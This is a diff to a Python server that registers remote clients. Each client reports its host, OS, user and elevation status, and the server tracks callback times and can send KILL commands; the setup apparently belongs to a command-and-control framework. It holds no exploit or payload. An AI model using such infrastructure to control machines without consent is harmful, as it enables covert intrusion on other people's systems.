@@ -29,7 +29,7 @@ Client will respond with KILL_R if server requests client to exit or if there's 
 Datastructure Diagram
 Client info is stored as a dictionary where each client's IP address is the key to a second dictionary of info about that client
 Currently, client info is composed of its assigned IP address, hostname, OS, the user running the client script, whether the script is running with elevated permissions or not, and the thread handling it
-clients_info['192.168.1.1'] # ['192.168.1.1', 'mybox', 'Windows 10', 'Admin', 1, socket, thread]
+clients_info['192.168.1.1'] # ['192.168.1.1', 'mybox', 'Windows 10', 'Admin', 1, socket, True, "01/02/2025 01:02:03]
 client_info ={
     "ipaddr" : parts[0],
     "hostname" : parts[1],
@@ -37,7 +37,8 @@ client_info ={
     "cur_user" : parts[3],
     "elevated" : parts[4],
     "cs" : client_sock,
-    "thrd" : thread
+    "alive" : True,
+    "callback" : get_time()
 }
 """
 
@@ -297,57 +298,64 @@ def handle_connections(server_sock):
             client_sock,addr = server_sock.accept()
         except TimeoutError:
             continue
-        client_sock.settimeout(TIMEOUT_TIME)
-        print(f"Got new connection from {addr}. ",end="")
+        print(f"Got new connection from {addr}. ",end="") # will be added onto later in the thread
+        # get this into a thread ASAP so that we can handle
+        thread = threading.Thread(target = handle_client2, args=(client_sock,addr))
+        thread.start()
 
-        try:
-            received_msg = client_sock.recv(BUFFER_SIZE).decode()
-        except Exception as e:
-            print(f"Failed to receive message from {addr}: {e}")
-            client_sock.close()
-            continue
+# New version of handle client that doesnt listen continuously after registration
+def handle_client2(client_sock,nat_addr):
+    client_sock.settimeout(TIMEOUT_TIME)
 
-        if received_msg.startswith("REG"):
-            # Register msg
-            # "REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
-            data = received_msg[len("REG "):]
-            parts = [part.strip() for part in data.split('|')]
-            print(f"Client resolves to {parts[0]}")
+    try:
+        received_msg = client_sock.recv(BUFFER_SIZE).decode()
+    except Exception as e:
+        print(f"Failed to receive message from {nat_addr}: {e}")
+        client_sock.close()
+        return
 
-            if len(parts) != 5:
-                print(f"Malformed REG message from {addr}: {received_msg}")
-                client_sock.send(b"KILL")
-                client_sock.close()
-                continue
+    if received_msg.startswith("REG"):
+        # Register msg
+        # "REG {ipaddress} | {hostname} | {sys_os} | {cur_user} | {elevated}"
+        data = received_msg[len("REG "):]
+        parts = [part.strip() for part in data.split('|')]
+        print(f"Client resolves to {parts[0]}")
 
-            thread = threading.Thread(target = handle_client, args=(client_sock,addr,data[0]))
-            client_info ={
-                "ipaddr" : parts[0],
-                "hostname" : parts[1],
-                "sys_os" : parts[2],
-                "cur_user" : parts[3],
-                "elevated" : parts[4],
-                "cs" : client_sock,
-                "thrd" : thread,
-                "alive" : True,
-                "callback" : get_time()
-            }
-
-            with clients_lock:
-                if data[0] in clients_info:
-                    print(f"Client {data[0]} appears to already be connected. Killing old client...")
-                    old_info = clients_info[client_info["ipaddr"]]
-                    old_info["cs"].send(b"KILL")
-                    #clients_info.pop(client_info["ipaddr"]) #no need as it gets replaced
-                clients_info[client_info["ipaddr"]] = client_info
-            
-            client_sock.send(b"REG_R")
-            #thread.start()
-        else:
-            print(f"Unknown startup msg from {addr}: {received_msg}. Killing client.")
+        if len(parts) != 5:
+            print(f"Malformed REG message from {nat_addr}: {received_msg}")
             client_sock.send(b"KILL")
             client_sock.close()
+            return
 
+        client_info ={
+            "ipaddr" : parts[0],
+            "hostname" : parts[1],
+            "sys_os" : parts[2],
+            "cur_user" : parts[3],
+            "elevated" : parts[4],
+            "cs" : client_sock,
+            "alive" : True,
+            "callback" : get_time()
+        }
+
+        with clients_lock:
+            if data[0] in clients_info:
+                print(f"Client {data[0]} appears to already be connected. Killing old client...")
+                old_info = clients_info[client_info["ipaddr"]]
+                old_info["cs"].send(b"KILL")
+                #clients_info.pop(client_info["ipaddr"]) #no need as it gets replaced
+            clients_info[client_info["ipaddr"]] = client_info
+        
+        client_sock.send(b"REG_R")
+
+        # Do not listen for further messages, as that will complicate the other parts of this program
+        
+    else:
+        print(f"Unknown startup msg from {nat_addr}: {received_msg}. Killing client.")
+        client_sock.send(b"KILL")
+        client_sock.close()
+
+# old
 def handle_client(client_sock,addr,real_addr): #real addr is a new copy so dont worry about
     global clients_info
 
